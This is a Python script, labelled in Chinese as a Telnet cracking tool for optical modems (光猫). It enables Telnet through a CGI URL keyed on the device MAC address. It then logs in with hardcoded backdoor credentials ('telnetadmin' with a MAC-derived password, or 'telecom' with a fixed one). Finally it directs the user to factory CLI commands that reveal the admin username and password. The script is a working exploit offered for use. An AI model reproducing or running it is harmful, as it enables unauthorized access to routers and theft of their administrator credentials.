import re
import telnetlib
import time

MAC = "34:2D:A3:C1:A8:F4"
IP = "192.168.1.1"


def validate_ip(ip):
    pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
    if not re.match(pattern, ip):
        raise ValueError("IP地址格式错误,请检查输入(如192.168.1.1)")
    return ip


def validate_mac(mac):
    mac = mac.replace(":", "").replace("-", "").upper()
    if not re.match(r"^[0-9A-F]{12}$", mac):
        raise ValueError("MAC地址格式错误,请检查输入(如68:40:3C:C4:C0:E4)")
    return mac


def telnet_connect(ip, username, password):
    try:
        tn = telnetlib.Telnet(ip, timeout=10)
        print("[连接成功] 正在登录...")

        # 登录用户名
        tn.read_until(b"login: ", timeout=5)
        tn.write(username.encode("ascii") + b"\n")
        print(f"[发送用户名]: {username}")

        # 登录密码
        tn.read_until(b"Password: ", timeout=5)
        tn.write(password.encode("ascii") + b"\n")
        print(f"[发送密码]: {password}")

        # 动态读取响应,检测命令行提示符
        output = b""
        start_time = time.time()
        while time.time() - start_time < 10:  # 延长等待时间至10秒
            data = tn.read_very_eager()
            if data:
                output += data
                # 使用正则匹配多种提示符($、#、> 或空行)
                if re.search(rb"[$#>]", output):
                    break
            time.sleep(0.1)
        else:
            print("[警告] 未检测到命令行提示符,可能登录失败")
            print(f"[原始响应]: {output.decode('ascii', errors='ignore')}")
            return None, None

        # 提取命令行提示符(确保返回字节类型)
        output_str = output.decode("ascii", errors="ignore").strip()
        prompt_match = re.search(
            r"([$#>])$", output_str, re.MULTILINE
        )  # 使用字符串模式
        prompt_char = prompt_match.group(1).encode("ascii") if prompt_match else b"$"

        print(f"[Telnet连接成功]\n{output_str}")
        return tn, prompt_char

    except Exception as e:
        print(f"[Telnet连接失败]: {str(e)}")
        return None, None


def telnet_interactive(tn, prompt_char):
    try:
        print("\n=== Telnet交互模式 ===")
        print("输入命令后按回车执行(输入exit/quit退出)")
        while True:
            cmd = input("[输入命令] ")
            if cmd.lower() in ["exit", "quit"]:
                print("[正在退出交互模式]")
                break
            tn.write(cmd.encode("ascii") + b"\n")  # 发送命令

            # 读取响应直到提示符(支持分页处理)
            full_response = b""
            while True:
                response = tn.read_very_eager()
                if not response:
                    break
                full_response += response
                # 检测分页提示(--More--)
                if b"--More--" in response:
                    tn.write(b" \n")  # 发送空格继续
                # 检测命令行提示符
                if prompt_char in response:
                    break
                # 设置超时避免无限循环
                time.sleep(0.5)

            # 打印完整响应
            print(full_response.decode("ascii", errors="ignore").strip())

    except KeyboardInterrupt:
        print("\n[已通过Ctrl+C退出交互模式]")
    finally:
        tn.close()
        print("[连接已关闭]")


def main():
    print("=== 光猫Telnet破解工具 ===")
    ip = input("请输入光猫IP地址(格式如192.168.1.1): ") or "192.168.1.1"
    validate_ip(ip)

    mac = validate_mac(input("请输入MAC地址(格式如68:40:3C:C4:C0:E4): "))
    print("\n⚠️ 请先手动开启Telnet：")
    print(
        f"1. 打开浏览器访问：http://{ip}:8080/cgi-bin/telnetenable.cgi?telnetenable=1&key={mac}"
    )
    print("2. 确认看到返回内容包含 'telnet开启'")

    while True:
        print("\n请选择破解模式：")
        print("1. 模式一(利用了MAC)")
        print("2. 模式二(通用账号密码)")
        print("3. 退出程序")

        choice = input("请输入选项(1/2/3): ")

        if choice == "1":
            tn, prompt_char = telnet_connect(
                ip, "telnetadmin", f"FH-nE7jA%5m{mac[-6:]}"
            )
        elif choice == "2":
            tn, prompt_char = telnet_connect(ip, "telecom", "nE7jA%5m")
        elif choice == "3":
            print("程序已退出")
            return
        else:
            print("无效选项,请重新选择")
            continue

        if tn:
            print("\n=== 连接成功后请执行以下命令 ===")
            print("1. load_cli factory")
            print("2. show admin_name")
            print("3. show admin_pwd")
            telnet_interactive(tn, prompt_char)
            break
        else:
            if input("连接失败,是否尝试另一种模式？(y/n): ").lower() != "y":
                print("程序已退出")
                break


if __name__ == "__main__":
    main()
